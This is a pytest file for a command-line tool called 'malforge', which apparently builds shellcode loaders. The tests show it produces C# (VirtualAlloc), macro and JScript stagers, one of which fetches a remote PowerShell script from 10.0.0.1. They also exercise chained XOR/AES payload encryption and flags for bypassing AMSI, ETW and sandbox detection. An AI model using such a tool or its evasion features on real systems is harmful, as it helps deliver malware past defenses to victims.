import os
import tempfile
import subprocess
import sys


def _run(*args):
    return subprocess.run(
        [sys.executable, '-m', 'malforge'] + list(args),
        capture_output=True, text=True, timeout=10,
    )


def test_version():
    r = _run('--version')
    assert r.returncode == 0
    assert 'malforge' in r.stdout


def test_formats_flag():
    r = _run('--formats')
    assert r.returncode == 0
    assert 'exe' in r.stdout
    assert 'macro' in r.stdout


def test_encodings_flag():
    r = _run('--encodings')
    assert r.returncode == 0
    assert 'xor' in r.stdout
    assert 'aes' in r.stdout


def test_no_args_fails():
    r = _run()
    assert r.returncode != 0


def test_exe_with_input_file():
    sc = os.urandom(64)
    with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as f:
        f.write(sc)
        inp = f.name
    with tempfile.NamedTemporaryFile(suffix='.cs', delete=False) as f:
        out = f.name

    r = _run('-f', 'exe', '-e', 'xor', '-i', inp, '-o', out)
    assert r.returncode == 0

    with open(out) as f:
        content = f.read()
    assert 'VirtualAlloc' in content

    os.unlink(inp)
    os.unlink(out)


def test_jscript_with_url():
    r = _run('-f', 'js', '--url', 'http://10.0.0.1/test.ps1')
    assert r.returncode == 0
    assert 'http://10.0.0.1/test.ps1' in r.stdout


def test_missing_shellcode_source():
    r = _run('-f', 'exe', '-e', 'xor')
    assert r.returncode != 0
    assert 'shellcode' in r.stderr.lower() or 'provide' in r.stderr.lower()


def test_bad_format():
    r = _run('-f', 'badformat', '-i', '/dev/null')
    assert r.returncode != 0


def test_chained_encryption():
    sc = os.urandom(64)
    with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as f:
        f.write(sc)
        inp = f.name

    r = _run('-f', 'exe', '-e', 'xor,aes', '-i', inp)
    assert r.returncode == 0
    assert 'CreateDecryptor' in r.stdout

    os.unlink(inp)


def test_custom_key():
    sc = os.urandom(64)
    with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as f:
        f.write(sc)
        inp = f.name

    r = _run('-f', 'exe', '-e', 'xor', '-i', inp, '--key', 'deadbeefcafebabe' * 2)
    assert r.returncode == 0

    os.unlink(inp)


def test_all_evasion_flags():
    sc = os.urandom(64)
    with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as f:
        f.write(sc)
        inp = f.name

    r = _run('-f', 'exe', '-e', 'xor', '-i', inp, '--amsi', '--etw', '--sandbox')
    assert r.returncode == 0
    assert 'LoadLibrary' in r.stdout or 'Etw' in r.stdout

    os.unlink(inp)
